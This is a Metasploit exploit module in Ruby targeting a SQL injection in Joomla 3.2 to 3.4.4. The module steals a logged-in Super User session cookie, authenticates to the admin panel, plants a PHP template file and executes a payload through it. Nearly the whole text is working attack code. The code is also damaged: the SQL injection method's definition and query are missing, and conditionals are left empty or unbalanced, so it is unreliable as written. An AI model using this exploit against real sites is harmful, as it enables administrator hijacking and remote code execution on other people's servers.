# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Joomla Content History SQLi Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits a SQL injection vulnerability found in Joomla versions
        3.2 up to 3.4.4. The vulnerability exists in the Content History administrator
        component in the core of Joomla. Triggering the SQL injection makes it possible
        to retrieve active Super User sessions. The cookie can be used to login to the
        Joomla administrator backend. By creating a new template file containing our
        payload, remote code execution is made possible.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Asaf Orpani&#039;, # Vulnerability discovery
          &#039;xistence <xistence[at]0x90.nl>&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2015-7857&#039; ], # Admin session hijacking
          [ &#039;CVE&#039;, &#039;2015-7297&#039; ], # SQLi
          [ &#039;CVE&#039;, &#039;2015-7857&#039; ], # SQLi
          [ &#039;CVE&#039;, &#039;2015-7858&#039; ], # SQLi
          [ &#039;URL&#039;, &#039;https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/&#039; ],
          [ &#039;URL&#039;, &#039;http://developer.joomla.org/security-centre/628-20151001-core-sql-injection.html&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          # Arbitrary big number. The payload gets sent as POST data, so
          # really it&#039;s unlimited
          &#039;Space&#039;       => 262144, # 256k
        },
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [ &#039;Joomla 3.x <= 3.4.4&#039;, {} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Oct 23 2015",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Joomla&#039;, &#039;/&#039;])
        ], self.class)

  end

  def check

    # Request using a non-existing table
    res = sqli(rand_text_alphanumeric(rand(10)+6))

    if res && res.body =~ /`(.*)_ucm_history`/
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe

  end



    # SQLi will only grab Super User sessions with a valid username and userid (else they are not logged in).
    # The extra search for NOT LIKE &#039;%IS NOT NULL%&#039; is because of our SQL data that&#039;s inserted in the session cookie history.
    # This way we make sure that&#039;s excluded and we only get real admin sessions.


    # Retrieve cookies
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "index.php"),
      &#039;vars_get&#039; => {
        &#039;option&#039; => &#039;com_contenthistory&#039;,
        &#039;view&#039; => &#039;history&#039;,
        &#039;list[ordering]&#039; => &#039;&#039;,
        &#039;item_id&#039; => &#039;1&#039;,
        &#039;type_id&#039; => &#039;1&#039;,
        &#039;list[select]&#039; => sql
        }
      })

    return res

  end


  def exploit

    res = sqli(rand_text_alphanumeric(rand(10)+6))

    if res && res.code == 500 && res.body =~ /`(.*)_ucm_history`/
    else
    end


    if res && res.code == 500 && res.body =~ /Duplicate entry &#039;([a-z0-9]+)&#039; for key/
      auth_cookie_part = $1[0...-1]
      print_status("#{peer} - Retrieved admin cookie [ #{auth_cookie_part} ]")
    else
      fail_with(Failure::Unknown, "#{peer}: No logged-in admin user found!")
    end

    # Retrieve cookies
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "administrator", "index.php")
    })

    if res && res.code == 200 && res.get_cookies =~ /^([a-z0-9]+)=[a-z0-9]+;/
      cookie_begin = $1
      print_status("#{peer} - Retrieved unauthenticated cookie [ #{cookie_begin} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Error retrieving unauthenticated cookie")
    end

    # Modify cookie to authenticated admin
    auth_cookie = cookie_begin
    auth_cookie << "="
    auth_cookie << auth_cookie_part
    auth_cookie << ";"

    # Authenticated session
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "administrator", "index.php"),
      &#039;cookie&#039;  => auth_cookie
      })

    if res && res.code == 200 && res.body =~ /Administration - Control Panel/
      print_status("#{peer} - Successfully authenticated as Administrator")
    else
      fail_with(Failure::Unknown, "#{peer} - Session failure")
    end


    # Retrieve template view
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "administrator", "index.php"),
      &#039;cookie&#039;  => auth_cookie,
      &#039;vars_get&#039; => {
        &#039;option&#039; => &#039;com_templates&#039;,
        &#039;view&#039; => &#039;templates&#039;
        }
      })

    # We try to retrieve and store the first template found
    if res && res.code == 200 && res.body =~ /\/administrator\/index.php\?option=com_templates&view=template&id=([0-9]+)&file=([a-zA-Z0-9=]+)/
      template_id = $1
      file_id = $2
    else
      fail_with(Failure::Unknown, "Unable to retrieve template")
    end

    filename = rand_text_alphanumeric(rand(10)+6)

    # Create file
    print_status("#{peer} - Creating file [ #{filename}.php ]")
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "administrator", "index.php"),
      &#039;cookie&#039;  => auth_cookie,
      &#039;vars_get&#039; => {
        &#039;option&#039; => &#039;com_templates&#039;,
        &#039;task&#039; => &#039;template.createFile&#039;,
        &#039;id&#039; => template_id,
        &#039;file&#039; => file_id,
        },
      &#039;vars_post&#039; => {
        &#039;type&#039; => &#039;php&#039;,
        &#039;name&#039; => filename
      }
      })

    # Grab token
    if res && res.code == 303 && res.headers[&#039;Location&#039;]
      location = res.headers[&#039;Location&#039;]
      print_status("#{peer} - Following redirect to [ #{location} ]")
      res = send_request_cgi(
        &#039;uri&#039;    => location,
        &#039;method&#039; => &#039;GET&#039;,
        &#039;cookie&#039; => auth_cookie
      )

      # Retrieving template token
      if res && res.code == 200 && res.body =~ /&([a-z0-9]+)=1\">/
        token = $1
        print_status("#{peer} - Token [ #{token} ] retrieved")
      else
        fail_with(Failure::Unknown, "#{peer} - Retrieving token failed")
      end

        template_path = $1
        print_status("#{peer} - Template path [ #{template_path} ] retrieved")
      else
        fail_with(Failure::Unknown, "#{peer} - Unable to retrieve template path")
      end

    else
      fail_with(Failure::Unknown, "#{peer} - Creating file failed")
    end

    filename_base64 = Rex::Text.encode_base64("/#{filename}.php")

    # Inject payload data into file
    print_status("#{peer} - Insert payload into file [ #{filename}.php ]")
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "administrator", "index.php"),
      &#039;cookie&#039;  => auth_cookie,
      &#039;vars_get&#039; => {
        &#039;option&#039; => &#039;com_templates&#039;,
        &#039;view&#039; => &#039;template&#039;,
        &#039;id&#039; => template_id,
        &#039;file&#039; => filename_base64,
        },
      &#039;vars_post&#039; => {
        &#039;jform[source]&#039; => payload.encoded,
        &#039;task&#039; => &#039;template.apply&#039;,
        token => &#039;1&#039;,
        &#039;jform[extension_id]&#039; => template_id,
        &#039;jform[filename]&#039; => "/#{filename}.php"
      }
      })

    if res && res.code == 303 && res.headers[&#039;Location&#039;] =~ /\/administrator\/index.php\?option=com_templates&view=template&id=#{template_id}&file=/
      print_status("#{peer} - Payload data inserted into [ #{filename}.php ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Could not insert payload into file [ #{filename}.php ]")
    end

    # Request payload
    register_files_for_cleanup("#{filename}.php")
    print_status("#{peer} - Executing payload")
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, template_path, "#{filename}.php"),
      &#039;cookie&#039;  => auth_cookie
    })

  end

end

